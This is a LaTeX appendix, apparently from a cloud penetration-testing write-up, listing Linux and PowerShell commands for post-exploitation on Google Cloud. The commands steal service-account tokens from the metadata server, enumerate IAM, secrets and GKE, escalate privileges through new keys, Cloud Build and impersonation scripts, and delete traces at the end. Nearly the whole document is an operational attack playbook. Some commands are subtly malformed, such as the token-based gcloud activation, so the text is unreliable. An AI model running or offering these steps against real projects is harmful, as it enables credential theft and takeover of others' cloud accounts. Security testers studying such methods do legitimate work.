Appendix A: Command Cheatsheet (Linux & Windows)
A.1 Metadata Service & Initial Identity Enumeration
\begin{table}[]
\begin{tabular}{lllllll}
Category               & Linux Command                                                                                                                                                        & Windows (PowerShell) Command                                                                                                                                                                          & \multicolumn{2}{l}{Description}             &        &        \\
Service Account Email  & curl -s -H "Metadata-Flavor: Google"   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email                                    & $Metadata = Invoke-RestMethod -Uri   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true"   -Headers @{"Metadata-Flavor"="Google"}; $Metadata.email & \multicolumn{4}{l}{Retrieve attached service account   email} \\
Access Token           & TOKEN=\$(curl -s -H "Metadata-Flavor: Google"   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   | jq -r .access\_token) & \$Token = (Invoke-RestMethod -Uri   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"   -Headers @\{"Metadata-Flavor"="Google"\}).access\_token            & \multicolumn{3}{l}{Retrieve OAuth2 access token}     &        \\
Full Instance Metadata & curl -s -H "Metadata-Flavor: Google"   http://metadata.google.internal/computeMetadata/v1/?recursive=true                                                            & \$Metadata = Invoke-RestMethod -Uri   "http://metadata.google.internal/computeMetadata/v1/?recursive=true"   -Headers @\{"Metadata-Flavor"="Google"\}                                                 & \multicolumn{3}{l}{Recursive metadata dump}          &       
\end{tabular}
\end{table}

A.2 CLI Authentication & Configuration
\begin{table}[]
\begin{tabular}{lllllll}
Category                 & Linux Command                                                                                                                                & Windows (PowerShell) Command                                                                                                                                              & \multicolumn{2}{l}{Description}             &        &        \\
Activate Service Account & gcloud auth activate-service-account --key-file=/dev/null --token=\$TOKEN                                                                    & gcloud auth activate-service-account --token=\$TOKEN                                                                                                                      & \multicolumn{4}{l}{Authenticate gcloud with metadata   token} \\
Set Project              & gcloud config set project \$(curl -s -H "Metadata-Flavor:   Google"   http://metadata.google.internal/computeMetadata/v1/project/project-id) & gcloud config set project \$(Invoke-RestMethod -Uri   "http://metadata.google.internal/computeMetadata/v1/project/project-id"   -Headers @\{"Metadata-Flavor"="Google"\}) & \multicolumn{2}{l}{Set active project ID}   &        &       
\end{tabular}
\end{table}

A.3 IAM & Permission Enumeration
\begin{table}[]
\begin{tabular}{llllll}
Category                   & Linux / Windows (gcloud)                                                                                                                             & \multicolumn{2}{l}{Description}                &        &    \\
List Service Accounts      & gcloud iam service-accounts list   --format="table(email,displayName)"                                                                               & \multicolumn{3}{l}{Enumerate all SAs in project}        &    \\
Get IAM Policy (SA)        & gcloud iam service-accounts get-iam-policy SA\_EMAIL                                                                                                 & \multicolumn{4}{l}{View IAM bindings on a service   account} \\
Get Project IAM Policy     & gcloud projects get-iam-policy PROJECT\_ID   --flatten="bindings{[}{]}.members"   --format="table(bindings.members, bindings.role)"                  & \multicolumn{3}{l}{Full project-level IAM dump}         &    \\
Test Effective Permissions & gcloud projects get-iam-policy PROJECT\_ID   --flatten="bindings{[}{]}.members"   --format="table(bindings.members, bindings.role)" | grep SA\_EMAIL & \multicolumn{4}{l}{Filter permissions for current SA}       
\end{tabular}
\end{table}

A.4 Privilege Escalation (Core & Advanced)
\begin{table}[]
\begin{tabular}{llllll}
Technique           & Linux / Windows Command                                                                                                                                          & Required Permission                                        & \multicolumn{2}{l}{Description}             &      \\
Create SA + Key     & gcloud iam service-accounts create privesc-sa \&\& gcloud iam   service-accounts keys create key.json   --iam-account=privesc-sa@PROJECT.iam.gserviceaccount.com & iam.serviceAccounts.create + iam.serviceAccountKeys.create & \multicolumn{3}{l}{Create new SA and key}          \\
Cloud Build Privesc & python3 cloudbuild.builds.create.py (from Rhino repo)                                                                                                            & cloudbuild.builds.create                                   & \multicolumn{3}{l}{RCE as Cloud Build SA}          \\
Deployment Manager  & python3 deploymentmanager.deployments.create.py (Rhino)                                                                                                          & deploymentmanager.deployments.create                       & \multicolumn{3}{l}{Deploy with elevated perms}     \\
Roles Update        & python3 iam.roles.update.py --role custom-role-name (Rhino)                                                                                                      & iam.roles.update                                           & \multicolumn{3}{l}{Modify custom role permissions} \\
Get Access Token    & python3 iam.serviceAccounts.getAccessToken.py --target-sa TARGET (Rhino)                                                                                         & iam.serviceAccounts.getAccessToken                         & \multicolumn{3}{l}{Impersonate target SA token}    \\
Sign Blob / JWT     & python3 signBlob-accessToken.py --target-sa TARGET (Rhino)                                                                                                       & iam.serviceAccounts.signBlob                               & \multicolumn{3}{l}{Sign to obtain token}          
\end{tabular}
\end{table}

A.5 Resource Enumeration
\begin{table}[]
\begin{tabular}{lllll}
Service           & Linux / Windows Command          & \multicolumn{2}{l}{Description}          &      \\
Compute Instances & gcloud compute instances list    & \multicolumn{2}{l}{List all VMs}         &      \\
Storage Buckets   & gsutil ls -r                     & \multicolumn{3}{l}{Recursive bucket listing}    \\
IAM on Bucket     & gsutil iam get gs://BUCKET\_NAME & \multicolumn{3}{l}{View bucket IAM policy}      \\
SQL Instances     & gcloud sql instances list        & \multicolumn{3}{l}{List Cloud SQL databases}    \\
Secrets           & gcloud secrets list              & \multicolumn{3}{l}{List Secret Manager secrets} \\
GKE Clusters      & gcloud container clusters list   & \multicolumn{2}{l}{List GKE clusters}    &     
\end{tabular}
\end{table}

A.6 GKE / Kubernetes Commands
\begin{table}[]
\begin{tabular}{lllll}
Category                 & Command                                                                                                                                                                                                & \multicolumn{2}{l}{Description}             &      \\
Get Credentials          & gcloud container clusters get-credentials CLUSTER --zone ZONE                                                                                                                                          & \multicolumn{3}{l}{Generate kubeconfig}            \\
RBAC Can-I               & kubectl auth can-i '*' '*' --all-namespaces                                                                                                                                                            & \multicolumn{3}{l}{Check maximum permissions}      \\
List ClusterRoleBindings & kubectl get clusterrolebindings                                                                                                                                                                        & \multicolumn{3}{l}{Enumerate high-priv bindings}   \\
Privileged Pods          & kubectl get pods --all-namespaces -o jsonpath='\{range   .items{[}*{]}\}\{.metadata.name\}\{"\textbackslash{}t"\}\{.spec.containers{[}*{]}.securityContext.privileged\}\{"\textbackslash{}n"\}\{end\}' & \multicolumn{3}{l}{Identify privileged containers} \\
HostPath Volumes         & kubectl get pods --all-namespaces -o json | jq '.items{[}{]} |   select(.spec.volumes{[}{]}?.hostPath != null) | .metadata.name'                                                                       & \multicolumn{3}{l}{Find hostPath mounts}          
\end{tabular}
\end{table}

A.7 Cleanup
\begin{table}[]
\begin{tabular}{lllll}
Command       & Platform                                                                                                           & \multicolumn{2}{l}{Description}         &     \\
Revoke Auth   & gcloud auth revoke                                                                                                 & \multicolumn{3}{l}{Revoke gcloud credentials} \\
Remove Config & rm -rf $\sim$/.config/gcloud (Linux) / Remove-Item -Recurse -Force   \$env:APPDATA\textbackslash{}gcloud (Windows) & \multicolumn{2}{l}{Delete local config} &    
\end{tabular}
\end{table}
